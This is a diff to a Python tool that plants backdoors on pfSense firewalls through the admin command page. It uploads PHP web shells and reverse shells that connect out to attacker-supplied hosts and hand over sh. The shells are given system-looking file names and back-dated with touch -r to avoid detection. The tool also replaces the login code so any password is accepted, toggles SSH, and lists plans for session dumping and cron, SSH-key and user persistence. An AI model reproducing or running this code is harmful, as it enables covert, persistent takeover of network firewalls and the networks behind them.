@@ -1,8 +1,11 @@
 #!/usr/bin/python3
 
 ## Ideas:
-# Make login page SQLmappable
-# Fix dates on certain files (touch -r)
+# Fix dates on certain files (touch -r) - DONE
+# Dump PHPSESSIDs to hidden file
+# Potentially chmod files so unable to change
+# SSH needs keys to connect, maybe create a "SSH bootstrap"
+
 
 import requests
 import re
@@ -36,9 +39,7 @@ level2 = """echo '<?php $up = """ + ip + """; $user = ip2long($_SERVER["REMOTE_A
 ## Reverse Shells
 level1Rev = """echo '<?php if(isset($_REQUEST["ip"]) && isset($_REQUEST["port"])){ $i = $_REQUEST["ip"]; $p = $_REQUEST["port"];$sock=fsockopen($i,$p);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); } ?>' > RevShell.php"""
 
-level2Rev = """echo '<?php if(isset($_REQUEST["host"])){ $h = $_REQUEST["host"]; $decoded = base64_decode($h); $array = explode(" ",$decoded); $i = $array[0]; $p = $array[1]; $sock=fsockopen($i,$p);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); }?>' > interfaces_ipv6.php""" 
-
-level3Rev = """echo '<?php if(isset($_POST["route"])){ $r = $_POST["route"]; $decoded = base64_decode($r); $array = explode(" ",$decoded); $i = $array[0]; $p = $array[1]; $sock=fsockopen($i,$p);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); }?>' > system_advanced_routes.php"""
+level2Rev = """echo '<?php $up = """ + ip + """; $user = ip2long($_SERVER["REMOTE_ADDR"]); if($up == $user){ if(isset($_REQUEST["host"])){ $h = $_REQUEST["host"]; $decoded = base64_decode($h); $array = explode(" ",$decoded); $i = $array[0]; $p = $array[1]; $sock=fsockopen($i,$p);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); }}else{echo hellothere;}?>' > interfaces_ipv6.php""" 
 
 loggedIn = False
 regex = "sid:.*;var"
@@ -86,6 +87,11 @@ def simplePOST(path, value, cmd, postdata):
     if(cmd == 0): csrf = re.findall(regex, r.text)[0][:-5]
     if(cmd == 1): print(r.text)
 
+
+def toggleSSH():
+    simpleGET("/", "", 0)
+    loginPOST()
+    cmdGET("echo 'y' | /etc/rc.initial.toggle_sshd")
 
 # Shell Accesses
 def skidyAccess():
@@ -161,10 +167,13 @@ def proWeb():
 
     level3cmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > system_firewall_manager.php"""
 
+    level3tad = "touch -r index.php interfaces_ipv6.php"
+
     simpleGET("/", "", 0)
     loginPOST()
     cmdGET(level3)
     cmdGET(level3cmd)
+    cmdGET(level3tad)
     print("Shell uploaded to %s/system_firewall_manager.php" % url)
     print("The variable is base64 encoded and accepted via POST requests only")
     print("No credentials needed to access :)")
@@ -184,11 +193,12 @@ def leetWeb():
 
     level4cmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > /etc/inc/auth.inc"""
 
+    level4tad = "touch -r index.php /etc/inc/auth.inc"
     simpleGET("/", "", 0)
     loginPOST()
     cmdGET(level4)
     cmdGET(level4cmd)
-    ## WRITE A WARNING HERE
+    cmdGET(level4tad)
     try:
         cmdGET("reboot")
     except:
@@ -209,15 +219,29 @@ def amatuerRev():
     simpleGET("/index.php", "", 0)
     loginPOST()
     cmdGET(level2Rev)
-    print("Visit %s/Revshell.php?ip=<IP>port=<PORT>" % url)
-    print("Or use the automatic rev shell popper")
+    print("Use the automatic rev shell popper please")
     print("No credentials needed to access :)")
 
 def proRev():
     global url
+
+    level3Rev = "echo '"
+    with open('Files/prorev.php', 'r') as file:
+        data = file.read()
+    data_mod = data.replace("HEYBEAR", ip).encode("ascii")
+    file.close()
+    level3Rev += base64.b64encode(data_mod).decode("ascii")
+    level3Rev += "' > temp_cache"
+
+    level3cmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > system_advanced_routes.php"""
+    level3tad = "touch -r index.php system_advanced_routes.php"
+
     simpleGET("/index.php", "", 0)
     loginPOST()
+
     cmdGET(level3Rev)
+    cmdGET(level3cmd)
+    cmdGET(level3tad)
     print("Use the automatic rev shell popper please")
     print("No credentials needed to access :)")
 
@@ -325,24 +349,23 @@ def details():
     password = input("Pfsense Password: ")
 
 def menu():
-    choice1 = input("Pick One:\n(1): Upload a WebShell\n(2): Access WebShell\n(3): Upload a ReverseShell\n(4): ReverseShell Popper\n(9): Execute a cmd\n(10): Full Web Backdoor\n-> ")
+    choice1 = input("Pick One:\n(1): Upload a WebShell\n(2): Access WebShell\n(3): Upload a ReverseShell\n(4): ReverseShell Popper\n(5): Backend Backdoors\n(9): Execute a cmd\n(10): Full Web Backdoor\n-> ")
     if(choice1 == "1"):
         choice2 = input("Pick Level\n(1): Skidy\n(2): Amatuer\n(3): Pro\n-> ")
         if(choice2 == "1"): skidyWeb()
         if(choice2 == "2"): amatuerWeb()
         if(choice2 == "3"): proWeb()
     if(choice1 == "2"):
-        choice2 = input("Pick Level\n(1): Skidy\n(2): Amatuer\n(3): Pro\n(4): 1337 Hax0r\n-> ")
+        choice2 = input("Pick Level\n(1): Skidy\n(2): Amatuer\n(3): Pro\n(4): Leet\n-> ")
         if(choice2 == "1"): skidyAccess()
         if(choice2 == "2"): amatuerAccess()
         if(choice2 == "3"): proAccess()
         if(choice2 == "4"): leetAccess()
     if(choice1 == "3"):
-        choice2 = input("Pick Level\n(1): Skidy\n(2): Amatuer\n(3): Pro\n(4): 1337 Hax0r\n-> ")
+        choice2 = input("Pick Level\n(1): Skidy\n(2): Amatuer\n(3): Pro\n-> ")
         if(choice2 == "1"): skidyRev()
         if(choice2 == "2"): amatuerRev()
         if(choice2 == "3"): proRev()
-        if(choice2 == "4"): leetRev()
     if(choice1 == "4"):
         ip = input("RHOST IP:\n-> ")
         port = input("RPORT PORT:\n-> ")
@@ -357,14 +380,26 @@ def menu():
             add_encoded = base64.b64encode(address).decode("ascii")
             path = "/interfaces_ipv6.php?host="
             simpleGET(path, add_encoded, 3)
-        if(choice2 == "3"): proRev()
+        if(choice2 == "3"):
+            address = (ip + " " + port).encode("ascii")
+            add_encoded = base64.b64encode(address).decode("ascii")
+            path = "/system_advanced_routes.php"
+            pro_data= {"route": add_encoded}
+            simplePOST(path, "", 1, pro_data)
+    if(choice1 == "5"):
+        choice2 = input("Pick Backdoor\n(1): Cronjob\n(2): SSH Keys\n(3): Add User\n(10): Toggle SSH\n-> ")
+        if(choice2 == "10"): toggleSSH()
     if(choice1 == "9"):
-        simpleGET("/", "", 1)
+        simpleGET("/", "", 0)
         loginPOST()
         cmd = input("CMD: ")
         cmdGET(cmd)
     if(choice1 == "10"):
-        leetWeb()
+        print("##### Leet Backdoor #####")
+        print("This will create:\n-Login will accept any password with valid username\n-Web shell on root page\n-Reverse shell on root page")
+        choice2 = input("This will require a restart of the firewall, is that ok? (1)Yes (2)No\n-> ")
+        if(choice2 == "1"): leetWeb()
+        if(choice2 == "2"): print("Safe one fam")
 
 def main():
 #    details()
